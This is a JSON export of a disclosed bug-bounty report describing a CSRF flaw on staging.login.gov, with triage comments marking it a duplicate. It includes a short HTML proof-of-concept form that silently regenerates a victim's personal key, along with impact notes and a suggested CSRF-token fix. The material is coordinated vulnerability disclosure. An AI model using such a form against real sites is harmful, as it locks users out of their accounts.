{"id":263512,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8yNjM1MTI=","url":"https://hackerone.com/reports/263512","title":"CSRF in generating a new Personal Key","state":"Closed","substate":"duplicate","severity_rating":"medium","readable_substate":"Duplicate","created_at":"2017-08-26T05:40:08.032Z","submitted_at":"2017-08-26T05:40:08.032Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"streaak","url":"/streaak","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/Lfxgo7R4a7nAKsZUyRyGdgs5/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a"},"is_me?":false,"cleared":true,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":21499,"url":"https://hackerone.com/tts","handle":"tts","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/021/499/a8abb6c9702d454ed2bcfa55bb077ac2e49988b9_original.png/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a","medium":"https://profile-photos.hackerone-user-content.com/variants/000/021/499/a8abb6c9702d454ed2bcfa55bb077ac2e49988b9_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"permissions":[],"submission_state":"open","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"profile":{"name":"TTS Bug Bounty","twitter_handle":"gsa_tts","website":"https://18f.gsa.gov","about":"The First Civilian Agency Public Bug Bounty Program"}},"has_bounty?":false,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":true,"disclosed_at":"2017-11-17T17:37:14.865Z","bug_reporter_agreed_on_going_public_at":"2017-11-02T08:14:55.012Z","team_member_agreed_on_going_public_at":"2017-11-17T17:37:14.549Z","comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"Hello team,\nI would like to report a CSRF which would allow an attacker to change a user's personal key.\n\n**Vulnerable URL-**\nstaging.login.gov\n\n**POC-**\n\nUse the following HTML form for performing the CSRF attack-\n\n```\n\u003chtml\u003e\n  \u003cbody\u003e\n  \u003cscript\u003ehistory.pushState('', '', '/')\u003c/script\u003e\n    \u003cform action=\"https://staging.login.gov/manage/personal_key\"\u003e\n      \u003cinput type=\"hidden\" name=\"resend\" value=\"true\" /\u003e\n      \u003cinput type=\"submit\" value=\"Submit request\" /\u003e\n    \u003c/form\u003e\n  \u003c/body\u003e\n\u003c/html\u003e\n```\n\nThis will redirect you to https://staging.login.gov/manage/personal_key?resend=true and we can use the key on the screen to login as the old key will be rendered invalid.\n\nPS- The user doesn't have to click on continue on the above page. The key would be changed either way. You can logout and login and test the new key and you will be successfully logged into the account.\n\n**IMPACT-**\nThis will pretty much deny a user to login to his system who has \"his device stolen or accounts hacked\" as mentioned by your policy.\n\n**FIX-**\nAdd a CSRF token while submitting the form.\n\nLet me know if you need anything else.\n\nBest regards,\nStreaak2\n\n\n\n","vulnerability_information_html":"\u003cp\u003eHello team,\u003cbr\u003e\nI would like to report a CSRF which would allow an attacker to change a user\u0026#39;s personal key.\u003c/p\u003e\n\n\u003cp\u003e\u003cstrong\u003eVulnerable URL-\u003c/strong\u003e\u003cbr\u003e\nstaging.login.gov\u003c/p\u003e\n\n\u003cp\u003e\u003cstrong\u003ePOC-\u003c/strong\u003e\u003c/p\u003e\n\n\u003cp\u003eUse the following HTML form for performing the CSRF attack-\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight html\"\u003e\u003ccode\u003e\u003cspan class=\"nt\"\u003e\u0026lt;html\u0026gt;\u003c/span\u003e\n  \u003cspan class=\"nt\"\u003e\u0026lt;body\u0026gt;\u003c/span\u003e\n  \u003cspan class=\"nt\"\u003e\u0026lt;script\u0026gt;\u003c/span\u003e\u003cspan class=\"nx\"\u003ehistory\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003epushState\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"dl\"\u003e\u0026#39;\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"s1\"\u003e/\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\u003cspan class=\"nt\"\u003e\u0026lt;/script\u0026gt;\u003c/span\u003e\n    \u003cspan class=\"nt\"\u003e\u0026lt;form\u003c/span\u003e \u003cspan class=\"na\"\u003eaction=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;https://staging.login.gov/manage/personal_key\u0026quot;\u003c/span\u003e\u003cspan class=\"nt\"\u003e\u0026gt;\u003c/span\u003e\n      \u003cspan class=\"nt\"\u003e\u0026lt;input\u003c/span\u003e \u003cspan class=\"na\"\u003etype=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;hidden\u0026quot;\u003c/span\u003e \u003cspan class=\"na\"\u003ename=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;resend\u0026quot;\u003c/span\u003e \u003cspan class=\"na\"\u003evalue=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;true\u0026quot;\u003c/span\u003e \u003cspan class=\"nt\"\u003e/\u0026gt;\u003c/span\u003e\n      \u003cspan class=\"nt\"\u003e\u0026lt;input\u003c/span\u003e \u003cspan class=\"na\"\u003etype=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;submit\u0026quot;\u003c/span\u003e \u003cspan class=\"na\"\u003evalue=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;Submit request\u0026quot;\u003c/span\u003e \u003cspan class=\"nt\"\u003e/\u0026gt;\u003c/span\u003e\n    \u003cspan class=\"nt\"\u003e\u0026lt;/form\u0026gt;\u003c/span\u003e\n  \u003cspan class=\"nt\"\u003e\u0026lt;/body\u0026gt;\u003c/span\u003e\n\u003cspan class=\"nt\"\u003e\u0026lt;/html\u0026gt;\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eThis will redirect you to \u003ca title=\"https://staging.login.gov/manage/personal_key?resend=true\" href=\"/redirect?url=https%3A%2F%2Fstaging.login.gov%2Fmanage%2Fpersonal_key%3Fresend%3Dtrue\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://staging.login.gov/manage/personal_key?resend=true\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e and we can use the key on the screen to login as the old key will be rendered invalid.\u003c/p\u003e\n\n\u003cp\u003ePS- The user doesn\u0026#39;t have to click on continue on the above page. The key would be changed either way. You can logout and login and test the new key and you will be successfully logged into the account.\u003c/p\u003e\n\n\u003cp\u003e\u003cstrong\u003eIMPACT-\u003c/strong\u003e\u003cbr\u003e\nThis will pretty much deny a user to login to his system who has \u0026quot;his device stolen or accounts hacked\u0026quot; as mentioned by your policy.\u003c/p\u003e\n\n\u003cp\u003e\u003cstrong\u003eFIX-\u003c/strong\u003e\u003cbr\u003e\nAdd a CSRF token while submitting the form.\u003c/p\u003e\n\n\u003cp\u003eLet me know if you need anything else.\u003c/p\u003e\n\n\u003cp\u003eBest regards,\u003cbr\u003e\nStreaak2\u003c/p\u003e\n","weakness":{"id":45,"name":"Cross-Site Request Forgery (CSRF)"},"original_report_id":263498,"original_report_url":"https://hackerone.com/reports/263498","attachments":[],"allow_singular_disclosure_at":null,"vote_count":4,"voters":["jensec","gevakun","malcolmx","its_afolic"],"severity":{"rating":"medium","author_type":"User"},"structured_scope":{"databaseId":1001,"asset_type":"URL","asset_identifier":"https://staging.login.gov","max_severity":"critical"},"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"can_edit_custom_fields_attributes":false,"activities":[{"id":1957397,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi @streaak2,\nThank you for the report. We are discussing this internally. We will get back to you once/when the review is complete. \nThanks!\n@rockyrobot","markdown_message":"\u003cp\u003eHi \u003ca href=\"/streaak2\"\u003e@streaak2\u003c/a\u003e,\u003cbr\u003e\nThank you for the report. We are discussing this internally. We will get back to you once/when the review is complete. \u003cbr\u003e\nThanks!\u003cbr\u003e\n\u003ca href=\"/rockyrobot\"\u003e@rockyrobot\u003c/a\u003e\u003c/p\u003e\n","automated_response":false,"created_at":"2017-08-26T21:15:22.434Z","updated_at":"2017-08-26T21:15:22.434Z","actor":{"username":"rockyrobot","cleared":false,"url":"/rockyrobot","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/112/256/061431018bdae2144e25297602c95722e8f2beed_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"tts","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1968119,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"Hey @streaak2 - \n\nThank you for your submission. We have validated this issue and forwarded the report to the responsible team for this application. They will evaluate and let us know whether or not they will be implementing a fix.\n\nThanks!","markdown_message":"\u003cp\u003eHey \u003ca href=\"/streaak2\"\u003e@streaak2\u003c/a\u003e - \u003c/p\u003e\n\n\u003cp\u003eThank you for your submission. We have validated this issue and forwarded the report to the responsible team for this application. They will evaluate and let us know whether or not they will be implementing a fix.\u003c/p\u003e\n\n\u003cp\u003eThanks!\u003c/p\u003e\n","automated_response":false,"created_at":"2017-08-31T07:53:29.519Z","updated_at":"2017-08-31T07:53:29.519Z","actor":{"username":"coffeecup","cleared":false,"url":"/coffeecup","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/163/756/b715ab701f6ba35c13cf00277bf23f9ab1a5e1cb_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"tts","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1969069,"is_internal":false,"editable":false,"type":"Activities::BugDuplicate","message":"Hi,\n\nThank you for your submission. Unfortunately, we received this report from another researcher. Your effort is appreciated and we wish that you'll continue to research and submit any future security issues you find.\n\nRegards.","markdown_message":"\u003cp\u003eHi,\u003c/p\u003e\n\n\u003cp\u003eThank you for your submission. Unfortunately, we received this report from another researcher. Your effort is appreciated and we wish that you\u0026#39;ll continue to research and submit any future security issues you find.\u003c/p\u003e\n\n\u003cp\u003eRegards.\u003c/p\u003e\n","automated_response":false,"created_at":"2017-08-31T16:15:49.447Z","updated_at":"2017-08-31T16:15:49.447Z","original_report_id":263498,"actor":{"username":"joystick","cleared":false,"url":"/joystick","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/167/228/0840eb314aa099d9369d475d9ef9ba6299e83822_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"tts","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":2040631,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hey, could you invite me to #263498 so that I can know the status of the report?\nThanks.\n","markdown_message":"\u003cp\u003eHey, could you invite me to \u003ca href=\"/reports/263498\"\u003e#263498\u003c/a\u003e so that I can know the status of the report?\u003cbr\u003e\nThanks.\u003c/p\u003e\n","automated_response":false,"created_at":"2017-10-03T11:36:18.929Z","updated_at":"2017-10-03T11:36:18.929Z","actor":{"username":"streaak","cleared":true,"url":"/streaak","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/Lfxgo7R4a7nAKsZUyRyGdgs5/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"tts","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":2123844,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"Since the original report has been disclosed. ","markdown_message":"\u003cp\u003eSince the original report has been disclosed. \u003c/p\u003e\n","automated_response":false,"created_at":"2017-11-02T08:14:55.051Z","updated_at":"2017-11-02T08:14:55.051Z","first_to_agree":true,"actor":{"username":"streaak","cleared":true,"url":"/streaak","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/Lfxgo7R4a7nAKsZUyRyGdgs5/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"tts","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":2165849,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"Happy to disclose, thanks for your work!","markdown_message":"\u003cp\u003eHappy to disclose, thanks for your work!\u003c/p\u003e\n","automated_response":false,"created_at":"2017-11-17T17:37:14.655Z","updated_at":"2017-11-17T17:37:14.655Z","actor":{"username":"jkm","cleared":false,"url":"/jkm","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/172/876/892cc8dda2c24d00e8e963b81dd9ab51a0bc784c_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"tts","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":2165850,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","markdown_message":"","automated_response":false,"created_at":"2017-11-17T17:37:14.925Z","updated_at":"2017-11-17T17:37:14.925Z","actor":{"username":"jkm","cleared":false,"url":"/jkm","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/172/876/892cc8dda2c24d00e8e963b81dd9ab51a0bc784c_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"tts","actor_is_team_member":false,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}